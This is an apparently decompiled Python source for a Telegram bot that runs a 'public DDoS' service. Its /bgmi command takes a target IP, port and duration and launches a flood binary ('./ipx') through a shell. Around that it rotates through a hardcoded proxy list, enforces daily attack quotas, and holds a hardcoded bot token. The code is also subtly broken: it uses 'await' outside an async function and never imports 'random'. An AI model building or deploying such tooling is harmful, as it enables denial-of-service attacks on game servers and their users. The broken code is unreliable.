# uncompyle6 version 3.9.0
# Python bytecode version base 3.9 (3496)
# Decompiled from: Python 3.9.13 (main, May 16 2023, 10:04:10) 
# [Clang 12.0.0 ]
# Embedded file name: mrin.py
import datetime
import logging
import os
from telebot import TeleBot, apihelper
from datetime import timedelta, timezone

def update_proxy():
    proxy_list = [
        'https://43.134.234.74:443',
        'https://175.101.18.21:5678',
        'https://179.189.196.52:5678',
        'https://162.247.243.29:80',
        'https://173.244.200.154:44302',
        'https://173.244.200.156:64631',
        'https://207.180.236.140:51167',
        'https://123.145.4.15:53309',
        'https://36.93.15.53:65445',
        'https://1.20.207.225:4153',
        'https://83.136.176.72:4145',
        'https://115.144.253.12:23928',
        'https://78.83.242.229:4145',
        'https://128.14.226.130:60080',
        'https://194.163.174.206:16128',
        'https://110.78.149.159:4145',
        'https://190.15.252.205:3629',
        'https://101.43.191.233:2080',
        'https://202.92.5.126:44879',
        'https://221.211.62.4:1111',
        'https://58.57.2.46:10800',
        'https://45.228.147.239:5678',
        'https://43.157.44.79:443',
        'https://103.4.118.130:5678',
        'https://37.131.202.95:33427',
        'https://172.104.47.98:34503',
        'https://216.80.120.100:3820',
        'https://182.93.69.74:5678',
        'https://8.210.150.195:26666',
        'https://49.48.47.72:8080',
        'https://37.75.112.35:4153',
        'https://8.218.134.238:10802',
        'https://139.59.128.40:2016',
        'https://45.196.151.120:5432',
        'https://24.78.155.155:9090',
        'https://212.83.137.239:61542',
        'https://46.173.175.166:10801',
        'https://103.196.136.158:7497',
        'https://82.194.133.209:4153',
        'https://210.4.194.196:80',
        'https://88.248.2.160:5678',
        'https://116.199.169.1:4145',
        'https://77.99.40.240:9090',
        'https://143.255.176.161:4153',
        'https://172.99.187.33:4145',
        'https://43.134.204.249:33126',
        'https://185.95.227.244:4145',
        'https://197.234.13.57:4145',
        'https://81.12.124.86:5678',
        'https://101.32.62.108:1080',
        'https://192.169.197.146:55137',
        'https://82.117.215.98:3629',
        'https://202.162.212.164:4153',
        'https://185.105.237.11:3128',
        'https://123.59.100.247:1080',
        'https://192.141.236.3:5678',
        'https://182.253.158.52:5678',
        'https://164.52.42.2:4145',
        'https://185.202.7.161:1455',
        'https://186.236.8.19:4145',
        'https://36.67.147.222:4153',
        'https://118.96.94.40:80',
        'https://27.151.29.27:2080',
        'https://181.129.198.58:5678',
        'https://200.105.192.6:5678',
        'https://103.86.1.255:4145',
        'https://171.248.215.108:1080',
        'https://181.198.32.211:4153',
        'https://188.26.5.254:4145',
        'https://34.120.231.30:80',
        'https://103.23.100.1:4145',
        'https://194.4.50.62:12334',
        'https://201.251.155.249:5678',
        'https://37.1.211.58:1080',
        'https://86.111.144.10:4145',
        'https://80.78.23.49:1080'
    ]
    
    proxy = random.choice(proxy_list)
    apihelper.proxy = proxy
    logging.info(f'Proxy updated to: {proxy}')
    

def reset_daily_counts():
    now = datetime.datetime.now()
    utc = datetime.datetime.utcnow()
    ist_now = utc.astimezone(timezone(timedelta(hours=5, minutes=30)))
    reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0)
    if ist_now > reset_time:
        reset_time += timedelta(days=1)
    
    delta = reset_time - ist_now
    
    user_attacks.clear()
    user_cooldowns.clear()
    user_photos.clear()
    user_bans.clear()
    
    logging.info('Reset the daily attack counts and other data at 12 AM IST.')
    
    return delta.total_seconds()

def update_proxy_command(message, bot):
    try:
        update_proxy()
        bot.send_message(message.chat.id, 'Proxy updated successfully.')
    except Exception as e:
        bot.send_message(message.chat.id, f'Failed to update proxy: {e}')

def is_valid_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def is_valid_port(port):
    try:
        port_number = int(port)
        return 0 <= port_number <= 65535
    except ValueError:
        return False

def is_valid_duration(duration):
    try:
        duration_number = int(duration)
        return duration_number > 0
    except ValueError:
        return False

def handle_photo(message, bot):
    if not message.from_user.id in user_ids:
        return
    if message.from_user.id in user_photos:
        return
    user_photos.append(message.from_user.id)
    


def bgmi_command(message, bot):
    try:
        if message.from_user.id not in EXEMPTED_USERS:
            if message.from_user.id in user_bans:
                ban_expiry = user_bans[message.from_user.id]
                remaining_ban_timer = ban_expiry - datetime.datetime.now()
                if remaining_ban_timer.total_seconds() > 0:
                    remaining_time = int(remaining_ban_timer.total_seconds())
                    bot.send_message(message.chat.id, f'⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️')
                    return
        
        if message.from_user.id in user_cooldowns:
            cooldown_time = user_cooldowns[message.from_user.id]
            remaining_time = cooldown_time - datetime.datetime.now()
            if remaining_time.total_seconds() > 0:
               bot.send_message(message.chat.id, f', 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(remaining_time.total_seconds())} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️')
               return
        if not message.from_user.id in EXEMPTED_USERS:
           if message.from_user.id in user_attacks:
              if user_attacks[message.from_user.id] > DAILY_ATTACK_LIMIT:
                 bot.send_message(message.chat.id, f'𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️')
                 return
        
           
        if not message.from_user.id in EXEMPTED_USERS:
            if message.from_user.id not in user_photos:
                ban_time = datetime.datetime.now() + timedelta(minutes=30)
                user_bans[message.from_user.id] = ban_time
                bot.send_message(message.chat.id, f'⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣\'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️')
                return
        
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.send_message(message.chat.id, '𝗖𝗕™ 𝗣𝗨𝗕𝗟𝗜𝗖 𝗗𝗱𝗢𝗦 𝗔𝗖𝗧𝗜𝗩𝗘 ✅ \n\n⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n/𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>')
            return
        target_ip, target_port, user_duration = args
        if not is_valid_ip(target_ip):
            bot.send_message(message.chat.id, 'Invalid IP address.')
            return
        if not is_valid_port(target_port):
            bot.send_message(message.chat.id, 'Invalid port number.')
            return
        if not is_valid_duration(user_duration):
            bot.send_message(message.chat.id, 'Invalid duration. Must be a positive integer.')
            return
        
        user_duration = int(user_duration)
        default_duration = 200
        
        bot.send_message(message.chat.id, f'🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣  {target_ip} : {target_port} 𝙛𝙤𝙧 {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ]\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️')
        
        if not message.from_user.id in EXEMPTED_USERS:
           if message.from_user.id in user_attacks:
              user_attacks[message.from_user.id] += 1
           else:
               user_attacks[message.from_user.id] = 1
        
        cooldown_time = datetime.datetime.now() + timedelta(seconds=user_duration)
        user_cooldowns[message.from_user.id] = cooldown_time
        logging.info(f'Attack started by {message.from_user.first_name} : {message.text} ')
        
        command = f'./ipx {target_ip} {target_port} {default_duration}'
        process = await create_subprocess_shell(command, stdout = -1, stderr = -1)
        stdout, stderr = await process.communicate()
        if stdout:
            print("STDOUT:\n", stdout.decode())
        if stderr:
           print("STDERR:\n", stderr.decode())
           bot.send_message(message.chat.id, f'Error running attack command: {stderr.decode()}')
           
        bot.send_message(CHANNEL_ID, f'Attack started by {message.from_user.first_name} : {message.text}')
    except Exception as e:
        bot.send_message(message.chat.id, f'An error occurred: {e}')

async def run_attack_command_async(message, bot):
    await bgmi_command(message, bot)
    

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
TOKEN = '8190247212:AAH6kzB0MA-U8Y-C0sszJjAvtXgyTjKr9vI'

bot = TeleBot(TOKEN)
user_attacks = {}
user_cooldowns = {}
user_photos = []
user_bans = {}
EXEMPTED_USERS = []
CHANNEL_ID = -1002413024371
DAILY_ATTACK_LIMIT = 1
COOLDOWN_DURATION = 60
BAN_DURATION = 1800
user_ids = []

@bot.message_handler(commands=['start', 'help'])
def handle_start_help(message):
    bot.reply_to(message, ' | [ DON\'T BE OVERSMART @VILAXLORD BAP HAI TUMHARA BKL ] |')

@bot.message_handler(commands=['update_proxy'])
def handle_update_proxy(message):
    update_proxy_command(message, bot)

@bot.message_handler(commands=['bgmi'])
async def handle_bgmi(message):
      await run_attack_command_async(message, bot)

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
     handle_photo(message, bot)

async def create_subprocess_shell(cmd, stdout=None, stderr=None):
    process = await asyncio.create_subprocess_shell(cmd, stdout = stdout, stderr = stderr)
    return process

async def none_stop():
   try:
      while True:
         await asyncio.sleep(reset_daily_counts())
   except Exception as e:
        logging.error(f'An error occurred: {e}')

if __name__ == '__main__':
    logging.info('Bot is starting...')
    import asyncio
    asyncio.run(none_stop())
    bot.polling(none_stop=True)